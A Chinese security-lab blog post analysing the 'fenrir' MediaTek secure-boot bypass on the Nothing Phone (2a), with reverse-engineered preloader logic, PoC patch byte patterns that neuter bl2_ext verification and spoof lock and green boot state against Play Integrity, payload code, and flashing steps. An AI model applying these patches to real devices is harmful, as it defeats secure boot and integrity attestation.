#  [安全启动链破坏][EL3级任意代码执行]记一次对Nothing Phone手机的漏洞利用链的研究  
湘岚实验室
                    湘岚实验室  湘岚实验室   2026-01-26 10:53  
  
>   
> 漏洞利用链：https://github.com/R0rt1z2/fenrir  
> Nothing Phone固件下载：https://github.com/spike0en/nothing_archive?tab=readme-ov-file  
  
  
先介绍一下bl2_ext  
，它是MTK设备 启动流程中一个运行在 EL3（ARM 最高特权级）的核心引导组件，全称可理解为 Bootloader Stage 2 Extended（二级引导加载器扩展模块）。  
  
bl2_ext  
位于BROM和preloader之后，是进入TEE、GZ、LK等核心组件前的一个关键节点。  
  
正常情况下，bl2_ext  
 负责对后续所有启动组件（TEE、GZ、LK、Linux 内核）进行**签名校验和完整性验证  
**，确保这些组件未被篡改。  
  
由于 bl2_ext  
 自身负责验证后续的所有引导组件 (TEE, GZ, lk, boot 等)，并且它在 **EL3**  
 (最高特权级别) 下运行，因此，能够任意修改 bl2_ext  
 就意味着可以完全打破整个安全启动链。  
  
而在**fenrir**  
类漏洞场景中，当seccfg配置为解锁状态时，preloader将直接跳过对bl2_ext的签名校验。由于preloader仍然会跳转到EL3级别执行bl2_ext，所以攻击者可构造恶意的bl2_ext组件，从而加载后续所有未经校验的系统镜像，攻破整个安全启动链。  
  
正常的Boot Chain  
  
![](https://mmbiz.qpic.cn/mmbiz_png/O215EUHTjcM5yhSeaRyzQ8k0b3VCoRg7tJZOnNsa6ZsMTt9Vm6ZfwbpuhAEwsF3zVWy7R5GcXicibgOUkEFEYsibw/640?wx_fmt=png&from=appmsg "")  
  
被攻破的Boot Chain  
  
![](https://mmbiz.qpic.cn/mmbiz_png/O215EUHTjcM5yhSeaRyzQ8k0b3VCoRg7wCas8yYBvRmY9jBjcWAkCS8tFuE9bGqicZlibBxI23Emql1APjeURNoQ/640?wx_fmt=png&from=appmsg "")  
# 准备工作  
  
在fenrir的README描述中，提到该漏洞可以在 Nothing Phone (2a) 上成功利用，所以在Nothing Archive上下载 Nothing Phone (2a) 的Full OTA和OTA images。我这里选择了一个比较早期的版本。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/O215EUHTjcM5yhSeaRyzQ8k0b3VCoRg7yf4NSCMOWFqBUNy0x5SaO7wObo46aMzicskAVYZg1OSpVt810nXhGPw/640?wx_fmt=png&from=appmsg "")  
  
该漏洞主要出现在preloader，所以要对preloader进行逆向分析  
  
在**Pacman_V3.2-250904-1648-image-firmware.7z**  
这个包里，可以找到preloader的二进制镜像文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/O215EUHTjcM5yhSeaRyzQ8k0b3VCoRg7RDsjNGLg7RRU2weW1W7Yza1He83wZS2LlMKersOh3qrHtJw9mPvGuw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/O215EUHTjcM5yhSeaRyzQ8k0b3VCoRg7fOicUnVCMBCQnACj1ymAvuWWtgf9qN8foopV3AY6OicVbEicmmzLB1B4Q/640?wx_fmt=png&from=appmsg "")  
  
查询可知Nothing Phone (2a) 的芯片为 MTK 天玑 7200 Pro  ，属于 ARMv8-A 64 位架构。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/O215EUHTjcM5yhSeaRyzQ8k0b3VCoRg7Zlvnd34WB1HYK55VuSicUtfRGXg4ubmw3buE2V2OlDWZRY1ovQfiaz6w/640?wx_fmt=png&from=appmsg "")  
  
用IDA的ARM架构，64位，little-endian打开  
  
![](https://mmbiz.qpic.cn/mmbiz_png/O215EUHTjcM5yhSeaRyzQ8k0b3VCoRg74Dicb8VXYdREMXv6sfz1uCeCD7reVwoHWLPU80ibqEicZia9kHmzLhncGg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/O215EUHTjcM5yhSeaRyzQ8k0b3VCoRg7lC04IJSX6JxicJGoOcOgGfTWnZiatLiaOOfgHgQCBM6wmibfdadk1t2DLA/640?wx_fmt=png&from=appmsg "")  
  
IDA能成功反汇编和反编译  
  
![](https://mmbiz.qpic.cn/mmbiz_png/O215EUHTjcM5yhSeaRyzQ8k0b3VCoRg7ribYdmQWZ0w2liaYHNuuVLRILZtVZ5OK54PXsjN1Ee27z6fLguac4v7w/640?wx_fmt=png&from=appmsg "")  
# 对preloader进行逆向分析  
## BROM和preloader的运行过程  
  
在实际逆向前先了解一下BROM和preloader的运行过程：  
  
手机上电后，芯片先从BROM开始执行。BROM会检查eFuse -> 校验preloader签名 -> 将preloader复制到SRAM，然后跳转执行。  
  
preloader启动后会关掉看门狗 -> 设置栈 -> 初始化一些最基础的硬件(DRAM,PMIC,clock) -> 从eFuse(查看secure boot是否开启)和seccfg(是否unlock)读取安全状态 -> 决定怎么启动( normal / recovery / fastboot ，决定启动 A/B 哪个slot) -> 读bl2_ext，决定是否验签 -> 跳转执行下一阶段。  
## 逆向分析  
  
从上面可以知道漏洞点主要发生在“读bl2_ext，决定是否验签”这个过程，那么要逆向的核心就是找到在哪里进行seccfg是否unlock的判断，以及在判断unlcok后，跳过验证执行后续阶段的部分。  
  
具体的逆向过程比较复杂就不详细阐述了，我的思路就是先通过字符串表找到了一些关键逻辑函数，然后不断查看交叉引用，找到了preloader的主流程函数，再继续跟踪到其他关键函数，最后还原出与漏洞相关的整个逻辑。  
  
下面是我还原的逻辑(关键函数做了重命名，同时贴出来的代码都是美化过的):  
  
首先是boot_flow_init()  
函数，它负责初始化和调用核心的状态检查逻辑。  
  
该函数在 0x58af8 处调用了pmic_boot_status_check_and_unlock(1);  
  
接着pmic_boot_status_check_and_unlock()  
在 0x58c40 处调用read_seccfg_and_set_verify_flag(2579LL, 0xEA24CuLL, 1LL, 7LL)  
。**它是读取 seccfg 状态的关键步骤**  
，并将结果输出到 MEMORY[0xEA24C]  
。  
  
read_seccfg_and_set_verify_flag()  
 从 seccfg  
 中解析安全状态，如果开启了 EC_REBOOT_ENABLE  
，就设置 verify flag 并返回状态；否则清零 flag。  
```
uint32_t read_seccfg_and_set_verify_flag(uint32_t tag, uint8_t *verify_flag){    uint32_t sec_status;    sec_status = parse_seccfg_status(*(uint32_t *)0xEA230);    if (sec_status & SECCFG_EC_REBOOT_ENABLE) {        /* EC reboot is enabled */        log("EC_REBOOT_ENABLE\n");        return sec_status;    }    /* EC reboot disabled */    *verify_flag = 0;    return0;}
```  
  
parse_seccfg_status()  
是一个包装函数，通过一个虚函数调用 seccfg 的 get_status()  
 方法 ，决定了 MEMORY[0xEA24C]  
是否被清零。  
```
uint64_t parse_seccfg_status(void seccfg_ctx){    / init or update seccfg context */    seccfg_prepare(seccfg_ctx);/* call seccfg_ctx->ops->get_status(seccfg_ctx, 56) */return seccfg_ctx->ops->get_status(seccfg_ctx, SECCFG_STATUS_OFFSET);}
```  
  
最后一步结合主流程函数和allow_skip_image_verify()  
函数分析。在allow_skip_image_verify()  
中，如果MEMORY[0xEA24C]  
在前面被清零，那么其返回值也是0，同时在主流程函数中也不会进行验签，直接跳转执行下一阶段。  
```
int main(int argc, const char **argv, const char **envp){    int n2;  // 启动状态码    unsignedint n0xD47 = 0; // 临时变量    unsignedint boot_flag;    // 初始化阶段，根据条件调用不同子系统    if (sub_5BBE4(argc)) {        v5 = sub_52F48(sub_457B0(sub_45794()));    } else {        v5 = sub_42EDC(sub_4450(sub_45778()));    }    // 各种硬件/配置初始化    v8 = sub_57744(v5);    v9 = sub_57778(v8, 536576LL);    v11 = sub_5773C(v9, (constchar *)(v10 + 3592));    v12 = sub_57734(v11);    MEMORY[0xE8AC0] = v13;    // 读取安全配置和状态    v49 = sub_58788(sub_57734(sub_5773C(sub_57744(sub_45628(sub_57734(sub_5773C(sub_57744(sub_52E24(sub_57734(sub_5773C(sub_57744(sub_21A64(v32)), "ow", ...)))))))), byte_83E37, ...)));    // 如果特殊 boot 分支    if (sub_515A0()) {        sub_5775C("", 540672LL);        n2 = 2;        goto FINISH_BOOT;    }    // 检查是否允许跳过 image verify    v206 = sub_45668(8u, ...);    if (!(_BYTE)v206 || allow_skip_image_verify() || !sub_50204()) {        if (!sub_58720(...)) {            if (!sub_58714()) {                // 处理电源或 RTC 异常                n2 = 1;                goto FINISH_BOOT;            }        }    } else {        sub_5B40C("ec reboot!\n", ...);        n2 = 0;    }FINISH_BOOT:    MEMORY[0xEB220] = n2;    // 后续日志和电源/传感器状态处理    v62 = sub_5B40C((constchar *)(sub_57764(sub_5FB6C(MEMORY[0xE8AC0])) + 1721), ..., "MDFE_PG, ");    sub_50BA0(sub_57734(v62));    v70 = sub_57734(sub_5773C(sub_57778(sub_5FB6C(MEMORY[0xE8AC0]), 532480LL), (constchar *)(v68 + 3858)));    sub_4FB5C(0LL, v70);    // 按键/长按重启处理    sub_3CC4(1LL, 1600000LL, ...);    sub_3C8C(sub_57734(sub_5773C(sub_57744(sub_3CC4(2LL, 1600000LL, ...)), "ot", ...)));    // AB boot 检查    ab_boot_check();    sub_57734(sub_5773C(sub_57744(...), " chip_ver[%x]\n", ...));    return0;}
```  
```
bool allow_skip_image_verify(void){    uint32_t boot_reason;    /* read boot status / reason register */    boot_reason = sub_58600(2578) & 0x3FF;    log("skip verify check: flag=%d, boot_reason=%u\n",        MEMORY[0xEA24C],        boot_reason << 5);    return (MEMORY[0xEA24C] != 0) && (boot_reason < 0x19);}
```  
  
**总结一下：**  
  
boot_flow_init  
 调用pmic_boot_status_check_and_unlock  
。  
  
pmic_boot_status_check_and_unlock  
调用read_seccfg_and_set_verify_flag  
。  
  
read_seccfg_and_set_verify_flag  
 调用 parse_seccfg_status  
 并根据其返回值的最高位来设置 MEMORY[0xEA24C]  
 的值。  
- 如果最高位为 **0**  
 (解锁)，则MEMORY[0xEA24C] = 0  
。  
  
- 如果最高位为 **1 **(锁定)，则 MEMORY[0xEA24C]  
保持非零。  
  
在main  
的allow_skip_image_verify  
中会检查MEMORY[0xEA24C]  
，并返回一个bool值，如果设备解锁，MEMORY[0xEA24C] = 0  
，那么就会跳过验证。  
# PoC分析  
  
PoC 的利用过程可以分为两个主要部分：**修补 (Patching)**  
 和 **刷入 (Flashing)**。  
## Patching  
  
injector/inject.py  
 脚本负责对原始的 lk.bin  
 (包含了 bl2_ext  
) 进行修补。其核心是 devices.py  
 文件中定义的 PatchStage  
。  
  
PoC中提供了多个型号的补丁，我这里还以Nothing Phone(2a)举例：  
```
DEVICES = [    Device(        'Pacman',        'Nothing Phone 2a',        {            # Ideally, we'd make room in the 'lk' partition for the payload, but for the sake            # of this demonstration, we take advantage of the fact that the BSP for this phone                 # includes a lot of eMMC-related code that isn’t actually used, since this device             # uses UFS instead.                                                                           #                                                                                             # Technically, these stages are not required by the exploit. They simply show                # that we can execute arbitrary code within the LK image, which is way cooler                # than just applying patches.                                                                #                                                                                             # The first address is the virtual base address where the stage payload is                   # injected. The second address is the address of the `bl` call that we override              # to jump to the payload instead (called pivot by me, which is probably wrong).            #'stage1': PayloadStage(            #    'stage1',            #    0xFFFF000050F6F0A8,  # emmc_init()            #    0xFFFF000050F05DA4,  # platform_init()            #    description='Pre-platform initialization stage',            #),            #'stage2': PayloadStage(            #    'stage2',            #    0xFFFF000050F6AE98, # msdc_tune_cmdrsp()            #    0xFFFF000050F0E088, # bl notify_enter_fastboot()            #    description='Pre-fastboot initialization stage',            #),            #'stage3': PayloadStage(            #    'stage3',            #    0xFFFF000050F6C168, # msdc_config_bus()            #    0xFFFF000050F0E0A4, # bl dprintf("%s:%d: Notify boot linux.\n")            #    description='Linux initialization stage',            #),            # This is what makes it possible for this exploit to work. Long            # story short, an LK image has various partitions inside it,            # which each have a specific purpose and get loaded at a specific            # address. The order matters, and each partition verifies the next            # one before loading it.            #            # From my analysis, the boot chain of this device is as follows:            # 1. BootROM (SoC)            # 2. Preloader            # 3. bl2_ext (LK)            # 4. TEE            # 5. GenieZone (GZ)            # 6. lk or aee (LK)            # 7. Linux kernel (boot)            # 8. ...            #            # BootROM is the first stage and is not modifiable (it's masked ROM) and            # it ALWAYS verifies and loads the Preloader against the fused root key.             # Then, under normal circumstances, the Preloader verifies and loads bl2_ext,             # which is the first partition of 'lk' to get verified and loaded. Then            # bl2_ext takes control of the boot process and verifies and loads            # the next partitions: TEE, GZ, LK, and so on.            #            # HOWEVER, this is not the case when seccfg is unlocked. When this            # happens, the Preloader DOES NOT verify bl2_ext even though bl2_ext            # itself still verifies the subsequent partitions. This means that one            # can arbitrarily modify bl2_ext so it does not verify the next            # partitions, which would lead to a full takeover of the secure boot chain.            'sec_get_vfy_policy': PatchStage(                'sec_get_vfy_policy',                pattern='00 01 00 b4 fd 7b bf a9',                replacement='00 00 80 52 c0 03 5f d6',                match_mode=MatchMode.ALL,                description='Don\'t enforce secure boot policy',            ),            'force_green_state': PatchStage(                'force_green_state',                pattern='c8 03 00 90 00 21 01 b9 c0 03 5f d6',                replacement='c8 03 00 90 1f 21 01 b9 c0 03 5f d6',                match_mode=MatchMode.ALL,                description='Force boot state to always be set to green',            ),            'bypass_security_control': PatchStage(                'bypass_security_control',                pattern='a9 74 01 94 20 01 00 36',                replacement='a9 74 01 94 1f 20 03 d5',                match_mode=MatchMode.ALL,                description='Skip security error branch - always execute commands',            ),            'spoof_sboot_state': PatchStage(                'spoof_get_sboot_state',                pattern='fd 7b be a9 f3 0b 00 f9 fd 03 00 91 f3 03 00 aa 20 00 80 52',                replacement='48 44 00 52 08 00 00 b9 00 00 80 52 c0 03 5f d6 1f 20 03 d5',                match_mode=MatchMode.ALL,                description='Force sboot state to always be ATTR_SBOOT_ONLY_ENABLE_ON_SCHIP',            ),            'spoof_lock_state': PatchStage(                'spoof_lock_state',                pattern='20 02 00 b4 fd 7b be a9 f3 0b 00 f9 fd 03 00 91',                replacement='88 00 80 52 08 00 00 b9 00 00 80 52 c0 03 5f d6',                match_mode=MatchMode.ALL,                description='Force lock state to always be LKS_LOCK',            )        },        # This is the virtual address where 'lk' (not the image but the partition)        # is loaded in memory. You can obtain this address by looking at the        # 'expdb' partition of the device, which contains boot logs.        base=0xFFFF000050F00000,    ),]
```  
  
其中的关键补丁是sec_get_vfy_policy  
，它通过搜索并替换 bl2_ext  
 中所有验证函数的字节码，来禁用安全启动策略。  
  
PoC 将bl2_ext  
 中所有负责验证下一个引导分区的函数的某个局部代码全部从00 01 00 b4 fd 7b bf a9  
替换为00 00 80 52 c0 03 5f d6  
- 00 00 80 52  
 -> mov w0, #0  
  (将返回值 w0  
 设置为 0)  
  
- c0 03 5f d6  
 -> ret  
 (立即从函数返回)  
  
这样就巧妙地将所有验证函数的内容替换为 return 0;  
。在 MTK 的引导逻辑中，返回 0  
 表示“验证成功”。  
  
成功打破了信任链之后，PoC 还应用了其他补丁来欺骗 Android 系统，使其认为设备仍然处于安全状态：  
- force_green_state  
: 强制引导状态为“绿色”(Green)，表示启动流程未被修改。  
  
- spoof_sboot_state  
: 伪造安全启动状态。  
  
- spoof_lock_state  
: 伪造锁状态为 LKS_LOCK  
。  
  
这些补丁的目的是为了通过 Google 的 Play Integrity (以前的 SafetyNet) 检查，让设备在被 root 的情况下也能正常使用银行等应用。  
## Payload注入(可选)  
  
PoC 还包含了一个可选的 PayloadStage  
 功能，用于在引导过程的不同阶段注入并执行任意代码。  
  
build.sh  
 脚本会下载交叉编译工具链，并使用 payload/Makefile  
 来编译 stage1  
、stage2  
 和 stage3  
 的 C 代码。  
```
#include "common.h"#include "debug.h"__attribute__((section(".text.main"))) int main(void) {    // This payload executes before LK calls platform_init(), which handles    // the initialization of platform-specific hardware components. This is    // one of the earliest points where we can execute custom code during    // the boot process.    printf("Entered pre-platform_init() stage1 payload!\n");    platform_init();    // The caller expects this function to return an integer value.    return 0;}
```  
```
#include "fastboot.h"#include "debug.h"void cmd_r0rt1z2(const char *arg, void *data, unsigned int sz) {    video_printf("r0rt1z2 was here...\n");    fastboot_info("pwned by r0rt1z2");    fastboot_okay("");}__attribute__((section(".text.main"))) void main(void) {    // This payload executes right before LK notifies the system to enter    // fastboot mode. This is the perfect spot to register custom fastboot    // commands that will be available during the fastboot session.    printf("Entered pre-notify_enter_fastboot() stage2 payload!\n");    fastboot_register("oem r0rt1z2", cmd_r0rt1z2, true, false);    notify_enter_fastboot();}
```  
```
#include "debug.h"#include "mmu.h"#include "string.h"#include "common.h"__attribute__((section(".text.main"))) void main(void) {    // This payload is executed right before LK emits an event to notify    // the system that it has to boot Linux.    printf("Entered pre-notify_boot_linux() stage3 payload!\n");    // If we wanted to, we could also patch the text in the rodata section by       // modifying the page table entries of the kernel address space.                //                                                                              // The following code demonstrates how to patch the "Orange State" string       // in the bootloader’s rodata section, which is used to indicate that the       // bootloader has been unlocked.                                                //                                                                              // In this case, it won't be noticeable since we're already patching the        // bootloader image to always use green state, but it serves as an example.     // set_pte_rwx(0xFFFF000050f9E3AE); // This modifies the page entry for the address                                     // to allow read, write (and execute)    // strcpy((char *)0xFFFF000050f9E3AE, "Patched by stage3");    // In this case we don't have to call any function since we're pivoting    // from a printf() call, which isn't expected to return anything meaningful.}
```  
  
然后inject.py  
 会将编译好的 payload 二进制文件注入到 lk.bin  
 镜像中的空闲区域 (例如，未使用的 eMMC 相关代码区域)。  
  
最后 PoC 会修改 bl2_ext  
 中的某个函数调用 (称为 pivot  
)，使其跳转到注入的 payload。payload 执行完毕后，再返回到原始的执行流程。  
  
这部分功能主要是为了演示攻击者可以在 EL3 级别获得任意代码执行的能力。  
## Flashing  
  
总体上是按以下步骤进行：  
1. 先要获取设备的 lk.bin  
 镜像。  
  
1. 运行 ./build.sh <device> <path_to_lk.bin>  
。脚本会编译 payload (如果有的话)，并调用 inject.py  
 将补丁和 payload 应用到 lk.bin  
，生成一个修改后的 <device>-fenrir.bin  
 文件。  
  
1. 使用 ./flash.sh <device>  
 (内部调用 fastboot  
)，将修改后的 bootloader 刷入设备。  
  
1. 重启设备。Preloader  
 因为设备已解锁，加载了被修改的 bl2_ext  
 而不进行验证。  
  
1. 被修改的 bl2_ext  
 在验证 TEE 等后续组件时，调用的是被替换为 return 0;  
 的函数，从而欺骗系统，让整个不安全的引导链得以继续。  
  
1. 最终，设备启动进入一个被完全控制的 Android 系统。  
  
# 总结  
  
这类漏洞利用当seccfg配置为解锁状态时，preloader将直接跳过对<font style="color:rgb(166, 44, 100);">bl2_ext</font>的签名校验的逻辑缺陷。通过构造恶意的<font style="color:rgb(166, 44, 100);">bl2_ext</font>组件，从而加载后续所有未经校验的系统镜像，攻破整个安全启动链。同时由于<font style="color:rgb(166, 44, 100);">bl2_ext</font>可以被完全控制，所以可以通过在<font style="color:rgb(166, 44, 100);">bl2_ext</font>中注入payload，劫持程序执行流程，实现EL3级任意代码执行。  
  
  
